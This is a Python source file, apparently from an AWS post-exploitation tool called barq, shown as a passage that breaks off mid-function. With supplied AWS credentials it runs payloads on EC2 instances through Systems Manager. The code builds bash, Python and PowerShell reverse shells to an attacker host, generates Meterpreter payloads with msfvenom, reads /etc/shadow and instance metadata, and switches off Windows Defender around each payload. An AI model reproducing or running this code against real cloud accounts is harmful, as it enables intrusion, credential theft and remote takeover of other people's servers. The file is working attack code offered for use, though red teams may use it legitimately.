#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
import logging
import os
import random
import readline
import signal
import string
import time
from getpass import getpass
from threading import Thread

import boto3
from clint.textui import indent, prompt
from prettytable import PrettyTable
from pygments import highlight
from pygments.formatters.terminal import TerminalFormatter
from pygments.lexers.data import JsonLexer

from src.arguments import cli_arguments
from src.constants.commands import PRINT_EC2_METADATA_CMD, PRINT_EC2_METADATA_PSH
from src.constants.logo import ASCII_LOGO
from src.helpers.get_regions import get_all_aws_regions
from src.helpers.print_output import add_color, print_color
from src.typing import T_REGION_NAME, T_ACCESS_KEY_ID, T_SECRET_KEY, T_TOKEN


def id_generator(size=10, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def set_session_region(region):
    global my_aws_creds
    mysession = None
    try:
        if my_aws_creds['aws_session_token'] == '':
            mysession = boto3.session.Session(
                aws_access_key_id=my_aws_creds['aws_access_key_id'],
                aws_secret_access_key=my_aws_creds['aws_secret_access_key'], region_name=region)
        else:
            mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
                                              aws_secret_access_key=my_aws_creds[
                                                  'aws_secret_access_key'], region_name=region,
                                              aws_session_token=my_aws_creds['aws_session_token'])
        return mysession
    except:
        return None


def start():
    """
        The start of the barq functionality.
    :return: None
    """
    signal.signal(signal.SIGINT, signal.default_int_handler)
    print_color(ASCII_LOGO, 'yellow')

    global loot_creds
    global ec2instances
    global menu_stack
    global my_aws_creds
    global secgroups
    global command_invocations
    global lambdafunctions
    menu_stack = []
    loot_creds = {'secrets': [], 'tokens': [], 'parameters': []}
    ec2instances = {'instances': []}
    lambdafunctions = {'functions': []}
    secgroups = {'groups': []}
    my_aws_creds = {}
    command_invocations = {'commands': []}
    global logger
    logger = logging.getLogger('log')
    logger.setLevel(logging.ERROR)
    logpath = 'log.log'
    ch = logging.FileHandler(logpath)
    ch.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
    logger.addHandler(ch)
    logger.error('calling start')

    if cli_arguments.key_id:
        aws_access_key_id = cli_arguments.key_id
        if not cli_arguments.secret_key:
            print_color("[!] --secret-key is required with --key-id")
            exit(1)
        aws_secret_access_key = cli_arguments.secret_key
        regions = cli_arguments.region
        if regions is None or []:
            print_color("[!] Region is not set. All available regions will be scanned. "
                        "First available region will be used")
            print_color("[!] Getting available regions...")
            regions = get_all_aws_regions()
        region_name = regions[0]
        if len(regions) > 1:
            print_color(f"[!] Multi-regional scan is not support now. '{region_name}' will be used")
        aws_session_token = cli_arguments.token

        set_aws_creds_inline(
            aws_access_key_id, aws_secret_access_key, region_name, aws_session_token)

    menu_forward('main')


def menu_forward(menu):
    """
    Go forward to a new menu (Push to menu stack)
    :param menu: The menu to go to
    :return: None
    """
    global menu_stack
    global logger
    if menu == 'training':
        menu_stack.append(menu)
        training_loop()
    elif menu == 'ec2instances':
        menu_stack.append(menu)
        instances_loop()
    else:
        logger.error('calling menu forward for main')
        menu_stack.append('main')
        main_loop()


def menu_backward():
    """
    Go back to previous menu (Pull from menu stack)
    :return: None
    """
    global menu_stack
    try:
        current_menu = menu_stack.pop()
        next_menu = menu_stack[-1]
        if next_menu == 'main':
            go_to_menu(next_menu)
        elif next_menu == 'training':
            go_to_menu(next_menu)
        elif next_menu == 'ec2instances':
            go_to_menu(next_menu)
    except Exception as e:
        print(e)
        pass


def go_to_menu(menu):
    """
    Go to a menu directly, bypassing the stack. This is used for functionality that involves interaction under a particular menu,
    and therefore does not add a menu to the stack.
    :param menu: menu to go to directly.
    :return: None
    """
    if menu == 'main':
        main_loop()
    elif menu == 'training':
        training_loop()
    elif menu == 'ec2instances':
        instances_loop()


def handle_menu():
    """
    Pop the top menu from the stack and go to it.
    :return: None
    """
    global menu_stack
    try:
        current_menu = menu_stack.pop()
        if current_menu == 'main':
            main_loop()
        elif current_menu == 'ec2instances':
            instances_loop()
        elif current_menu == 'training':
            training_loop()
        else:
            main_loop()
    except Exception as e:
        print(e)
    main_loop()


def training_loop():
    """
    The menu handler loop for the training menu. Reads commands and send them to the processor, otherwise shows the menu prompt.
    :return: None
    """
    try:
        command = ''
        while command == '':
            try:
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(trainingcomplete)
                command = input(
                    'barq ' + add_color('training', 'yellow') + ' > ')
            except Exception as e:
                print(e)
            # command = prompt.query('aws sheller training > ', validators=[])
        command = str(command)
        process_training_command(command)
    except KeyboardInterrupt as k:
        print("CTRL C clicked in training")
        menu_backward()


def disable_windows_defender():
    """
    The powershell command to disable windows defender.
    :return: Returns the powershell command to disable win defender.
    """
    return "Set-MpPreference -DisableRealtimeMonitoring $true"


def enable_windows_defender():
    """
    Enable Windows Defender Powershell command.
    :return: Returns the powershell command to enable win defender again.
    """
    return "Set-MpPreference -DisableRealtimeMonitoring $false"


def wait_for_command_invocation(ssmclient, commandid, instanceid):
    """

    :param ssmclient: The ssm (Systems manager) client associated with the required region and account.
    :param commandid: The id of the command to check invocation results for.
    :param instanceid: The id of the instance on which the command was run.
    :return: Returns a tuple of success state and AWS response json in full.
    """
    time.sleep(10)
    result = ssmclient.get_command_invocation(
        CommandId=commandid, InstanceId=instanceid)
    print_color('[..] Waiting for command to return.... This will take some time')
    while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
        time.sleep(10)
        result = ssmclient.get_command_invocation(
            CommandId=commandid, InstanceId=instanceid)
        if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
            print_color('[!] ERROR: %s' % result['StandardErrorContent'])
            return False, result
    print_color('[*] Status of the command is: %s' % result['Status'])
    if result['Status'] == 'Success':
        print_color('[+] Success! The command executed successfully. Output is:')

        print_color(result['StandardOutputContent'], 'blue')
    return True, result


def wait_for_threaded_command_invocation(commandid, instanceid, region):
    """
    A thread-ready function to wait for invocation for a command on an instance.
    TODO: Make it thread-safe by using locks on the global variables.
    :param commandid: The command that was run
    :param instanceid: The instance on which the command was run.
    :param region: The region for Systems Manager
    :return: Returns a tuple of success state and AWS response json in full.
    """
    global my_aws_creds
    logger = logging.getLogger('log')
    logger.error('inside wait_for_threaded_command_invocation for %s and commandid: %s' % (
        instanceid, commandid))
    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
                                      aws_secret_access_key=my_aws_creds['aws_secret_access_key'],
                                      region_name=region,
                                      aws_session_token=my_aws_creds['aws_session_token'])
    ssmclient = mysession.client('ssm', region_name=region)
    time.sleep(10)
    logger.error(
        'inside wait_for_threaded_command_invocation for %s and commandid: %s, before get_command_invocation a' % (
            instanceid, commandid))
    result = ssmclient.get_command_invocation(
        CommandId=commandid, InstanceId=instanceid)
    logger.error(
        'inside wait_for_threaded_command_invocation for %s and commandid: %s, after get_command_invocation a, status: %s' % (
            instanceid, commandid, result['Status']))
    while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
        time.sleep(10)
        result = ssmclient.get_command_invocation(
            CommandId=commandid, InstanceId=instanceid)
        if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
            logger.error(
                'failure in wait_for_threaded_command_invocation for %s and commandid: %s, after get_command_invocation b, status: %s' % (
                    instanceid, commandid, result['Status']))
            return False, result
    if result['Status'] == 'Success':
        logger.error(
            'success in wait_for_threaded_command_invocation for %s and commandid: %s, after get_command_invocation b, status: %s' % (
                instanceid, commandid, result['Status']))
        return True, result


def run_linux_command(ssmclient, instanceid, action, payload):
    """
    Run a Systems Manager command on a running Linux instance.
    :param ssmclient: Systems Manager client for the required region.
    :param instanceid: id of target instance
    :param action: Action to be run (AWS calls it DocumentName, here it's running a bash script)
    :param payload: The actual payload to be executed on the target instance.
    :return: returns status of execution.
    """
    response = ssmclient.send_command(InstanceIds=[instanceid, ], DocumentName=action,
                                      DocumentVersion='$DEFAULT', TimeoutSeconds=3600,
                                      Parameters={'commands': [payload]})
    commandid = response['Command']['CommandId']
    success, result = wait_for_command_invocation(
        ssmclient, commandid, instanceid)
    return success


def run_threaded_linux_command(mysession, target, action, payload):
    """
    Thread-enabled function to run a Systems Manager command on a running Linux instance.
    TODO: Make it thread-safe by using locks on global variables.
    :param mysession: The established boto3 session for the target region
    :param target: Target EC2 instance
    :param action: Action to be run (AWS calls it DocumentName, here it's running a bash script)
    :param payload: The actual payload to be executed on the target instance.
    :return: None
    """
    global my_aws_creds
    global command_invocations
    logger = logging.getLogger('log')
    logger.error('inside run_threaded_linux_command for %s' % target['id'])
    commandid = ''
    result = {}
    instanceid = target['id']
    last_error = ''
    try:
        mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
                                          aws_secret_access_key=my_aws_creds[
                                              'aws_secret_access_key'], region_name=target['region'],
                                          aws_session_token=my_aws_creds['aws_session_token'])
        ssmclient = mysession.client('ssm', region_name=target['region'])

        response = ssmclient.send_command(InstanceIds=[
            instanceid, ], DocumentName=action, DocumentVersion='$DEFAULT', TimeoutSeconds=3600,
            Parameters={'commands': [payload]})
        commandid = response['Command']['CommandId']
        logger.error('calling run_threaded_linux_command for %s and command: %s' % (
            target['id'], commandid))
        command = {'id': commandid}
        command['instanceid'] = instanceid
        command['state'] = 'requested'
        command['platform'] = 'linux'
        command['region'] = target['region']
        command_invocations['commands'].append(command)
        time.sleep(10)
        result = ssmclient.get_command_invocation(
            CommandId=commandid, InstanceId=instanceid)
    except Exception as e:
        logger.error(e)
        last_error = str(e)
        pass
    logger.error('calling run_threaded_linux_command for %s and command: %s ' % (
        target['id'], commandid))
    if 'Status' not in result:
        logger.error('run_threaded_linux_command for %s and command: %s failed with error: %s' % (
            target['id'], commandid, last_error))
        return
    while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
        time.sleep(10)
        result = ssmclient.get_command_invocation(
            CommandId=commandid, InstanceId=instanceid)
        if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
            for index, commandx in enumerate(command_invocations['commands']):
                if commandx['id'] == commandid:
                    logger.error('run_threaded_linux_command for %s and command: %s failed with error: %s' % (
                        target['id'], commandid, result['StandardErrorContent']))
                    commandx['state'] = 'failed'
                    commandx['error'] = result['StandardErrorContent']
                    command_invocations['commands'][index] = commandx
            return False
    if result['Status'] == 'Success':
        for index, commandx in enumerate(command_invocations['commands']):
            if commandx['id'] == commandid:
                logger.error('run_threaded_linux_command for %s and command: %s succeeded with output: %s' % (
                    target['id'], commandid, result['StandardOutputContent']))
                commandx['state'] = 'success'
                commandx['output'] = result['StandardOutputContent']
                command_invocations['commands'][index] = commandx


def run_threaded_windows_command(mysession, target, action, payload, disableav):
    """
    Thread-enabled function to run a Systems Manager command on a running Windows instance.
    It actually calls three commands: Disable windows defender, run the payload, then enable Windows Defender.
    TODO: Make it thread-safe by using locks on global variables.
    :param mysession: The established boto3 session for the target region
    :param target: Target EC2 instance
    :param action: Action to be run (AWS calls it DocumentName, here it's running a powershell script)
    :param payload: The actual payload to be executed on the target instance.
    :return: None
    """
    global my_aws_creds
    global command_invocations
    logger = logging.getLogger('log')
    response = {}
    commandid = ''
    logger.error("inside run_threaded_windows_command for %s" % target['id'])
    mysession = boto3.session.Session(aws_access_key_id=my_aws_creds['aws_access_key_id'],
                                      aws_secret_access_key=my_aws_creds['aws_secret_access_key'],
                                      region_name=target['region'],
                                      aws_session_token=my_aws_creds['aws_session_token'])

    logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
        target['id'], 'ssmclient'))
    ssmclient = mysession.client('ssm', region_name=target['region'])
    instanceid = target['id']
    # stage1 disable windows defender.
    if disableav:
        logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
            target['id'], 'disable_windows_defender'))
        try:
            response = ssmclient.send_command(InstanceIds=[instanceid, ], DocumentName=action,
                                              DocumentVersion='$DEFAULT', TimeoutSeconds=3600, Parameters={
                    'commands': [disable_windows_defender()]})

            commandid = response['Command']['CommandId']
        except Exception as e:
            logger.error(e)
            return False
        #############
        time.sleep(10)
        logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
            target['id'], 'get_command_invocation 1'))
        try:
            result = ssmclient.get_command_invocation(
                CommandId=commandid, InstanceId=instanceid)
        except:
            pass
        #############
        success, result = wait_for_threaded_command_invocation(
            commandid, instanceid, target['region'])
        logger.error("inside run_threaded_windows_command for %s, after line: %s" % (
            target['id'], 'wait_for_threaded_command_invocation 1'))
        logger.error("success equals: %s" % success)
        if not success:
            logger.error('aborting commands for id %s' % target['id'])
            return False
    # stage2 run payload
    time.sleep(3)
    logger.error(
        "inside run_threaded_windows_command for %s, before line: %s" % (target['id'], 'windows payload'))
    try:
        response = ssmclient.send_command(InstanceIds=[
            instanceid, ], DocumentName=action, DocumentVersion='$DEFAULT', TimeoutSeconds=3600,
            Parameters={'commands': [payload]})
    except Exception as e:
        logger.error("inside run_threaded_windows_command for instance %s, returning error: %s" % (
            target['id'], str(e)))
        return False
    commandid = response['Command']['CommandId']
    #################
    command = {'id': commandid}
    command['instanceid'] = instanceid
    command['state'] = 'requested'
    command['platform'] = 'windows'
    command['region'] = target['region']
    command_invocations['commands'].append(command)
    time.sleep(10)
    logger.error("inside run_threaded_windows_command for %s, before line: %s" % (
        target['id'], 'get_command_invocation 2'))
    try:
        result = ssmclient.get_command_invocation(
            CommandId=commandid, InstanceId=instanceid)
    except:
        pass
    while result['Status'] in {'InProgress', 'Pending', 'Waiting'}:
        time.sleep(10)
        result = ssmclient.get_command_invocation(
            CommandId=commandid, InstanceId=instanceid)
        if result['Status'] in {'Failed', 'TimedOut', 'Cancelling', 'Cancelled'}:
            logger.error("failure running payload in run_threaded_windows_command for %s, commandid: %s" % (
                target['id'], commandid))
            for index, commandx in enumerate(command_invocations['commands']):
                if commandx['id'] == commandid:
                    commandx['state'] = 'failed'
                    commandx['error'] = result['StandardErrorContent']
                    command_invocations['commands'][index] = commandx
                    success = False
                    break
    if result['Status'] == 'Success':
        logger.error(
            "success running payload in run_threaded_windows_command for %s. commandid: %s" % (target['id'], commandid))
        for index, commandx in enumerate(command_invocations['commands']):
            if commandx['id'] == commandid:
                commandx['state'] = 'success'
                commandx['output'] = result['StandardOutputContent']
                command_invocations['commands'][index] = commandx
                success = True
                break

    #################
    if not success:
        logger.error(
            "inside run_threaded_windows_command for %s, failed in running payload" % (target['id']))
    # stage3 enable windows defender.
    if disableav:
        time.sleep(30)
        logger.error(
            "inside run_threaded_windows_command for %s, before enable_windows_defender" % (target['id']))
        response = ssmclient.send_command(InstanceIds=[instanceid, ], DocumentName=action, DocumentVersion='$DEFAULT',
                                          TimeoutSeconds=3600, Parameters={
                'commands': [enable_windows_defender()]})
        commandid = response['Command']['CommandId']
        success, result = wait_for_threaded_command_invocation(
            commandid, instanceid, target['region'])
        logger.error("inside run_threaded_windows_command for %s, after enable_windows_defender, success: %s" % (
            target['id'], success))
        if not success:
            return False
    return True


def run_windows_command(ssmclient, instanceid, action, payload, disableav):
    """
    Run a Systems Manager command on a running Windows instance.
    It actually calls three commands: Disable windows defender, run the payload, then enable Windows Defender.
    :param ssmclient: The Systems Manager client for the target region
    :param instanceid: Target EC2 instance id
    :param action: Action to be run (AWS calls it DocumentName, here it's running a powershell script)
    :param payload: The actual payload to be executed on the target instance.
    :return: status of execution
    """
    time.sleep(3)
    # stage1 disable windows defender.
    if disableav:
        print_color('[..] Disabling Windows Defender momentarily...')
        response = ssmclient.send_command(InstanceIds=[instanceid, ], DocumentName=action, DocumentVersion='$DEFAULT',
                                          TimeoutSeconds=3600, Parameters={
                'commands': [disable_windows_defender()]})
        commandid = response['Command']['CommandId']
        success, result = wait_for_command_invocation(ssmclient, commandid, instanceid)
        if not success:
            print_color('[!] Could not disable Windows Defender... Stopping command invocation...')
            return False

    # stage2 run payload
    print_color('[..] Running payload...')
    time.sleep(3)
    response = ssmclient.send_command(InstanceIds=[instanceid, ], DocumentName=action,
                                      DocumentVersion='$DEFAULT', TimeoutSeconds=3600,
                                      Parameters={'commands': [payload]})
    commandid = response['Command']['CommandId']
    success, result = wait_for_command_invocation(ssmclient, commandid, instanceid)
    if not success:
        print_color('[!] Could not run payload... Stopping command invocation...')
        return False
    # stage3 enable windows defender.
    if disableav:
        time.sleep(30)
        print_color('[..] Enabling Windows Defender again....')
        response = ssmclient.send_command(InstanceIds=[instanceid, ], DocumentName=action, DocumentVersion='$DEFAULT',
                                          TimeoutSeconds=3600, Parameters={
                'commands': [enable_windows_defender()]})
        commandid = response['Command']['CommandId']
        success, result = wait_for_command_invocation(ssmclient, commandid, instanceid)
        if not success:
            print_color('[!] Could not enable Windows Defender... Stopping command invocation...')
            return False
    return True


def choose_training_ami():
    """
    Choose the AMI name for the training mode based on the OS choice.
    :return: Tuple of OS and AMI name.
    """
    print_color('[*] Choose your EC2 OS:')
    ami_options = [{'selector': '1', 'prompt': 'Linux', 'return': 'linux'},
                   {'selector': '2', 'prompt': 'Windows', 'return': 'windows'}]
    ami = prompt.options('Options:', ami_options)
    if ami == 'windows':
        return "windows", 'Windows_Server-2019-English-Full-Base-2019.01.10'
    return "linux", 'amzn2-ami-hvm-2.0.20190115-x86_64-gp2'


def shellscript_options(OS):
    """
    Prompts command options against an EC2 instance, depending on target OS.
    :param OS: Target instance OS.
    :return: Tuple of payload and action (AWS SSM DocumentName)
    """
    disableav = False
    print_color('[*] Choose your payload:')
    if OS == 'linux':
        payload_options = [{'selector': '1', 'prompt': 'cat /etc/passwd', 'return': 'cat /etc/passwd'},
                           {'selector': '2', 'prompt': 'cat /ect/shadow',
                            'return': 'cat /etc/shadow'},
                           {'selector': '3', 'prompt': 'uname -a',
                            'return': 'uname -a'},
                           {'selector': '4', 'prompt': 'reverse shell to external host',
                            'return': 'reverseshell'},
                           {'selector': '5', 'prompt': 'whoami', 'return': 'whoami'},
                           {'selector': '6', 'prompt': 'metasploit', 'return': 'msf'},
                           {'selector': '7',
                            'prompt': 'print EC2 metadata and userdata (custom init script)',
                            'return': PRINT_EC2_METADATA_CMD},
                           {'selector': '8', 'prompt': 'Visit a URL from inside EC2 instance', 'return': 'URL'}
                           ]
        action = 'AWS-RunShellScript'
    else:
        payload_options = [{'selector': '1', 'prompt': 'ipconfig', 'return': 'ipconfig'},
                           {'selector': '2', 'prompt': 'reverse shell to external host',
                            'return': 'reverseshell'},
                           {'selector': '3', 'prompt': 'whoami', 'return': 'whoami'},
                           {'selector': '4', 'prompt': 'metasploit', 'return': 'msf'},
                           {'selector': '5',
                            'prompt': 'print EC2 metadata and userdata (custom init script)',
                            'return': PRINT_EC2_METADATA_PSH},
                           {'selector': '6', 'prompt': 'Visit a URL from inside EC2 instance', 'return': 'URL'}]
        action = 'AWS-RunPowerShellScript'

    payload = prompt.options('Payload:', payload_options)
    remote_ip_host = ''
    remote_port = ''

    if payload == "reverseshell" or payload == "msf":
        print_color(
            '[*] You chose %s option. First provide your remote IP and port to explore shell options.' % payload)
        remote_ip_host = prompt.query(
            'Your remote IP or hostname to connect back to:')
        remote_port = prompt.query("Your remote port number:", default="4444")
        if payload == "reverseshell":
            payload, action = reverseshell_options(remote_ip_host, remote_port, OS)
        elif payload == "msf":
            payload, action = metasploit_installed_options(remote_ip_host, remote_port, OS)
        disableav = True
    elif payload == 'URL':
        print_color('[*] Choose the URL to visit from inside the EC2 instance:')
        URL = prompt.query('URL: ', default="http://169.254.169.254/latest/")

        if OS == 'linux':
            payload = "python -c \"import requests; print requests.get('%s').text;\"" % URL
        else:
            payload = "echo (Invoke-WebRequest -UseBasicParsing -Uri ('%s').Content;" % URL
    return payload, action, disableav


def reverseshell_options(host, port, OS):
    """
    Prompts for reverse shell options against an EC2 instance depending on its OS.
    :param host: The listening server's IP or hostname
    :param port: Port to listen on for shells.
    :param OS: OS of that target instance.
    :return: Tuple of reverse shell payload and action (AWS SSM DocumentName)
    """
    print_color('[*] Choose your reverse shell type:')
    bash_shell = "bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port)
    python_shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (
        host, port)
    powershell_shell = "$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" % (
        host, port)
    if OS == "linux":
        action = "AWS-RunShellScript"
        shell_options = [{'selector': '1', 'prompt': 'Bash reverse shell', 'return': bash_shell},
                         {'selector': '2', 'prompt': 'Python reverse shell',
                          'return': python_shell},
                         {'selector': '3', 'prompt': 'Empire Python Launcher', 'return': 'empirepython'}]
    else:
        action = "AWS-RunPowerShellScript"
        shell_options = [{'selector': '1', 'prompt': 'Powershell reverse shell', 'return': powershell_shell},
                         {'selector': '2', 'prompt': 'Empire Powershell Launcher', 'return': 'empirepowershell'}]
    reverseshell = prompt.options('Payload:', shell_options)
    if reverseshell == 'empirepowershell' or reverseshell == 'empirepython':
        print_color('[*] Generate your Empire launcher code in empire and paste it here:')
        reverseshell = input('Paste here:')

    return reverseshell, action


def reverseshell_multiple_options(linux, windows):
    """
    Prompts for reverse shell options against a range of EC2 instances depending on their OS.
    :param linux: Whether or not there are any targeted instances running Linux.
    :param windows: Whether or not there are any targeted instances running Windows.
    :return: Tuple of reverse shell payloads for linux and windows.
    """
    print_color('[*] Choose your reverse shell type:')
    print_color('[*] Make sure your listening server can handle multiple simultaneous reverse shell connections:')

    linuxattack = ''
    windowsattack = ''
    if linux:
        linux_options = [{'selector': '1', 'prompt': 'Bash reverse shell', 'return': 'bash'},
                         {'selector': '2', 'prompt': 'Python reverse shell',
                          'return': 'python'},
                         {'selector': '3', 'prompt': 'Empire Python Launcher', 'return': 'empirepython'}]
        linuxattack = prompt.options(
            'Payload for Linux EC2 instances:', linux_options)

        if linuxattack == 'empirepython':
            print_color(
                '[*] Generate your Empire python launcher code in empire and paste it here:')
            linuxattack = input('Paste here:')
        else:
            host = prompt.query(
                'Your remote IP or hostname to connect back to:')
            port = prompt.query("Your remote port number:", default="4444")
            if linuxattack == 'bash':
                linuxattack = "bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port)
            elif linuxattack == 'python':
                linuxattack = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (
                    host, port)

    if windows:
        windows_options = [{'selector': '1', 'prompt': 'Powershell reverse shell', 'return': 'powershell'},
                           {'selector': '2', 'prompt': 'Empire Powershell Launcher', 'return': 'empirepowershell'}]
        windowsattack = prompt.options(
            'Payload for Windows EC2 instances:', windows_options)
        if windowsattack == 'empirepowershell':
            print_color(
                '[*] Generate your Empire powershell launcher code in empire and paste it here:')
            windowsattack = input('Paste here:')
        else:
            host = prompt.query(
                'Your remote IP or hostname to connect back to:')
            port = prompt.query("Your remote port number:", default="5555")
            if windowsattack == 'powershell':
                windowsattack = "$client = New-Object System.Net.Sockets.TCPClient(\"%s\",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" % (
                    host, port)

    return linuxattack, windowsattack


def metasploit_not_installed_options(host, port, OS):
    """
    options in case metasploit is not locally installed on attack system.
    TODO: Implement this
    :param host: The listening server's IP or hostname
    :param port: Port to listen on for shells.
    :param OS: OS of that target instance.
    :return: Nothing
    """
    pass


def metasploit_installed_multiple_options(linux, windows):
    """
    Prompts for metasploit  options against a range of EC2 instances depending on their OS.
    :param linux: Whether or not there are any targeted instances running Linux.
    :param windows: Whether or not there are any targeted instances running Windows.
    :return: Tuple of metasploit payloads for linux and windows.
    """
    print_color(
        '[*] Choose your metasploit payload. This requires msfvenom to be installed in your system.')
    linux_tcp_meterpreterx64 = 'python/meterpreter/reverse_tcp'
    linux_https_meterpreterx64 = 'python/meterpreter/reverse_https'
    linux_tcp_shell = 'python/shell_reverse_tcp'
    windows_tcp_meterpreterx64 = 'windows/x64/meterpreter/reverse_tcp'
    windows_https_meterpreterx64 = 'windows/x64/meterpreter/reverse_https'
    windows_tcp_shell = 'windows/x64/shell/reverse_tcp'
    linuxattack = ''
    windowsattack = ''

    # remote_ip_host = prompt.query('Your remote IP or hostname to connect back to:')
    # remote_port = prompt.query("Your remote port number:", default="4444")

    if linux:
        linux_options = [
            {'selector': '1', 'prompt': 'Linux Meterpreter reverse TCP x64', 'return': linux_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Linux Meterpreter reverse HTTPS x64',
             'return': linux_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Linux TCP Shell', 'return': linux_tcp_shell}]
        linuxpayload = prompt.options(
            'Payload for Linux EC2 instances:', linux_options)
        host = prompt.query('Your remote IP or hostname to connect back to:')
        port = prompt.query(
            "Your remote port number (Listener ports should be different for linux and windows):", default="4444")
        linuxmsfshell = 'msfvenom -a python --platform python -p %s LHOST=%s LPORT=%s -f raw --smallest' % (
            linuxpayload, host, port)
        print_color(
            '[*] Run the following command on your remote listening server to run the linux payload handler:')
        msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" % (
            host, port, linuxpayload)
        print_color(msfconsole_cmd, 'magenta')
        linuxattack = os.popen(linuxmsfshell).read()
        linuxattack = "python -c \"%s\"" % linuxattack
    if windows:
        windows_options = [
            {'selector': '1', 'prompt': 'Windows Meterpreter reverse TCP x64', 'return': windows_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Windows Meterpreter reverse HTTPS x64',
             'return': windows_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Windows TCP Shell', 'return': windows_tcp_shell}]
        windowspayload = prompt.options(
            'Payload for Windows EC2 instances:', windows_options)
        host = prompt.query('Your remote IP or hostname to connect back to:')
        port = prompt.query(
            "Your remote port number (Listener ports should be different for linux and windows):", default="5555")
        windowsmsfshell = 'msfvenom -a x64 --platform Windows -p %s LHOST=%s LPORT=%s --f psh-net --smallest' % (
            windowspayload, host, port)
        print_color(
            '[*] Run the following command on your remote listening server to run the windows payload handler:')
        msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" % (
            host, port, windowspayload)
        print_color(msfconsole_cmd, 'magenta')
        windowsattack = os.popen(windowsmsfshell).read()

    return linuxattack, windowsattack


def metasploit_installed_options(host, port, OS):
    """
    Prompts for metasploit options against an EC2 instance depending on its OS.
    :param host: IP or hostname of the listening server running metasploit exploit handler.
    :param port: The port the exploit handler is listening on.
    :param OS: The OS of the target instance
    :return: Tuple of reverse shell payloads for linux and windows.
    """
    print_color(
        '[*] Choose your metasploit payload. This requires msfvenom to be installed in your system.')

    # output = os.popen("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f psh --smallest").read()`

    linux_tcp_meterpreterx64 = 'python/meterpreter/reverse_tcp'
    linux_https_meterpreterx64 = 'python/meterpreter/reverse_https'
    linux_tcp_shell = 'python/shell_reverse_tcp'
    windows_tcp_meterpreterx64 = 'windows/x64/meterpreter/reverse_tcp'
    windows_https_meterpreterx64 = 'windows/x64/meterpreter/reverse_https'
    windows_tcp_shell = 'windows/x64/shell/reverse_tcp'

    if OS == 'linux':
        action = 'AWS-RunShellScript'
        shell_options = [
            {'selector': '1', 'prompt': 'Linux Meterpreter reverse TCP x64', 'return': linux_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Linux Meterpreter reverse HTTPS x64',
             'return': linux_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Linux TCP Shell', 'return': linux_tcp_shell}]
    else:
        action = 'AWS-RunPowerShellScript'
        shell_options = [
            {'selector': '1', 'prompt': 'Windows Meterpreter reverse TCP x64', 'return': windows_tcp_meterpreterx64},
            {'selector': '2', 'prompt': 'Windows Meterpreter reverse HTTPS x64',
             'return': windows_https_meterpreterx64},
            {'selector': '3', 'prompt': 'Windows TCP Shell', 'return': windows_tcp_shell}]

    payload = prompt.options('Payload:', shell_options)
    if OS == 'linux':
        msfshell = 'msfvenom -p %s LHOST=%s LPORT=%s -f raw --smallest' % (
            payload, host, port)
    else:
        msfshell = 'msfvenom -p %s LHOST=%s LPORT=%s --f psh-net --smallest' % (
            payload, host, port)

    print_color('[*] Run the following command on your reverse server running the handler:')
    msfconsole_cmd = "msfconsole -x 'use exploit/multi/handler; set LHOST %s; set lport %s; set payload %s;run -j;'" % (
        host, port, payload)
    print_color(msfconsole_cmd, 'magenta')

    shellcode = os.popen(msfshell).read()
    if OS == 'linux':
        shellcode = "python -c \"%s\"" % shellcode

    return shellcode, action


def start_training_mode(caller):
    """
    Start the training mode.
    :param caller: menu that called this function
    :return: None
    """
    global my_aws_creds
    mysession = ''
    try:
        mysession = my_aws_creds['session']
    except:
